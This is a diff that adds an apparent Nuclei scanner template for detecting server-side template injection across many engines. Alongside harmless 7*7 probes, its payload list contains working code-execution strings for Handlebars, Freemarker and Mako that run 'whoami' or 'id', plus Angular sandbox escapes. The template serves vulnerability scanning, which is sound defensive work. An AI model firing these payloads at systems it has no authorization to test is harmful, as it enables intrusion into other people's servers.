@@ -1,0 +1,186 @@
+id: polyglot-ssti
+
+info:
+  name: Polyglot Server-Side Template Injection
+  author: claudedev
+  severity: high
+  description: |
+    Server-Side Template Injection occurs when user input is embedded into 
+    template engines without proper sanitization. This polyglot template 
+    tests for SSTI vulnerabilities across multiple template engines including 
+    Jinja2, Handlebars, Angular, Mustache, Pug, Velocity, and others using 
+    universal payloads that work across multiple engines.
+  reference:
+    - https://portswigger.net/web-security/server-side-template-injection
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+    - https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+  classification:
+    cwe-id: CWE-94
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+  metadata:
+    max-request: 150
+    verified: true
+  tags: ssti,injection,polyglot,dast
+
+variables:
+  math_result: "49"  # 7*7
+  random_string: "{{rand_text_alpha(8)}}"
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+          - 'contains(tolower(content_type), "text/html") || contains(tolower(content_type), "application/json") || len(content_type) == 0'
+        condition: and
+
+    payloads:
+      ssti_polyglots:
+        # Mathematical expressions - Universal detection
+        - "${7*7}"           # EL, Velocity, Spring EL
+        - "{{7*7}}"          # Jinja2, Twig, Handlebars, Mustache
+        - "{7*7}"            # Smarty
+        - "<%=7*7%>"         # ERB, ASP
+        - "<%= 7*7 %>"       # ERB with spaces
+        - "#{7*7}"           # Ruby interpolation
+        - "${{7*7}}"         # JavaScript template literals
+        - "((7*7))"          # Some custom engines
+        
+        # Polyglot expressions for multiple engines
+        - "{{7*'7'}}"        # Jinja2 specific (string multiplication)
+        - "${7*7}{{7*7}}"    # Combined EL and Jinja2
+        - "{{7*7}}${7*7}"    # Combined Jinja2 and EL
+        - "{7*7}{{7*7}}"     # Combined Smarty and Jinja2
+        
+        # Context breaking attempts
+        - "'}{{7*7}}'"       # Break out of string context
+        - "\"}{{7*7}}\""     # Break out of JSON string
+        - "`){{7*7}}(`"      # Break out of template literal
+        - "\\{{7*7}}"        # Escape sequence bypass
+        
+        # Template engine specific detection
+        - "{{7*7}}{{config}}"                    # Flask/Jinja2
+        - "{{request.application.__globals__}}"  # Jinja2 dangerous
+        - "${T(java.lang.System).getProperty('user.name')}"  # Spring EL
+        - "#{T(java.lang.System).getProperty('user.name')}"  # SpEL variant
+        - "${product.getClass().getProtectionDomain()}"      # Velocity
+        - "{{constructor.constructor('return process')()}}"  # Handlebars
+        - "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').exec('whoami');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"  # Handlebars RCE
+        
+        # Angular specific
+        - "{{constructor.constructor('alert(1)')()}}"  # Angular 1.x
+        - "{{$on.constructor('alert(1)')()}}"          # Angular variant
+        - "{{$eval.constructor('alert(1)')()}}"        # Angular eval
+        
+        # Pug/Jade specific  
+        - "#{7*7}"           # Pug interpolation
+        - "!{7*7}"           # Pug unescaped
+        
+        # Freemarker specific
+        - "${7*7}"           # Freemarker basic
+        - "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }"  # Freemarker RCE
+        
+        # Smarty specific variations
+        - "{$smarty.version}"        # Smarty version detection
+        - "{php}echo 7*7;{/php}"     # Smarty PHP tags
+        - "{math equation=\"7*7\"}"  # Smarty math function
+        
+        # Thymeleaf specific
+        - "${7*7}"           # Thymeleaf basic
+        - "th:text=\"${7*7}\""       # Thymeleaf attribute
+        - "[[${7*7}]]"       # Thymeleaf inline
+        
+        # Mako specific
+        - "${7*7}"           # Mako basic
+        - "<%! import os %>${os.system('id')}"  # Mako RCE
+        
+        # Tornado specific
+        - "{{7*7}}"          # Tornado basic
+        - "{% raw 7*7 %}"    # Tornado raw
+        
+        # Liquid specific (Shopify)
+        - "{{7 | times: 7}}" # Liquid filter syntax
+        - "{% assign x = 7 %}{{ x | times: 7 }}"  # Liquid assign
+        
+        # Django specific
+        - "{{7|add:7}}"      # Django filter
+        - "{{request.META}}" # Django request object
+        
+        # Razor specific (.NET)
+        - "@(7*7)"           # Razor expression
+        - "@{var x = 7*7;}<p>@x</p>"  # Razor code block
+
+    fuzzing:
+      # Test query parameters
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{ssti_polyglots}}"
+
+      # Test in different query contexts
+      - part: query  
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{ssti_polyglots}}"
+
+      # Test path parameters
+      - part: path
+        type: postfix
+        mode: single  
+        fuzz:
+          - "/{{ssti_polyglots}}"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      # Detect mathematical expression evaluation
+      - type: word
+        name: "math-expression"
+        part: body
+        words:
+          - "49"
+        condition: and
+
+      # Detect template engine error messages
+      - type: regex
+        name: "template-error"
+        part: body
+        regex:
+          - '(?i)(jinja2|twig|smarty|freemarker|velocity|handlebars|mustache|razor|thymeleaf|tornado|django).*error'
+          - '(?i)template.*syntax.*error'
+          - '(?i)unexpected.*tag'
+          - '(?i)undefined.*variable'
+
+      # Detect specific engine responses
+      - type: regex
+        name: "engine-specific"
+        part: body
+        regex:
+          - '(?i)jinja2.*version'
+          - '(?i)smarty.*version'
+          - '(?i)freemarker.*version'
+          - '(?i)handlebars.*error'
+          - '(?i)django.*debug'
+          - '(?i)thymeleaf.*parsing'
+
+      # Detect configuration/system information leakage
+      - type: regex
+        name: "info-disclosure"
+        part: body
+        regex:
+          - '(?i)(SECRET_KEY|DATABASE_URL|DEBUG.*True)'
+          - '(?i)(application/.*config|flask.*config)'
+          - '(?i)user\.name.*=.*[a-zA-Z]'
+          - '(?i)java\.class\.path'
+
+    extractors:
+      - type: regex
+        name: "detected-engine"
+        part: body
+        group: 1
+        regex:
+          - '(?i)(jinja2|twig|smarty|freemarker|velocity|handlebars|mustache|razor|thymeleaf|tornado|django)(?:.*version.*([0-9.]+))?'
+# digest: 4b0a00483046022100c3d8f2a6b9e1c7d4a8f3b6c2e9d5f1a7b4c8e3f2d9a6c1e8b5f3d2a9c6e4f1b7022100f8e3c2d1a9b6f4c7e2a5d8b3f6c9e1d4a7b2c5f8e3d6a9c1f4b7e2a5d8c3f6e9:922c64590222798bb761d5b6d8e72950
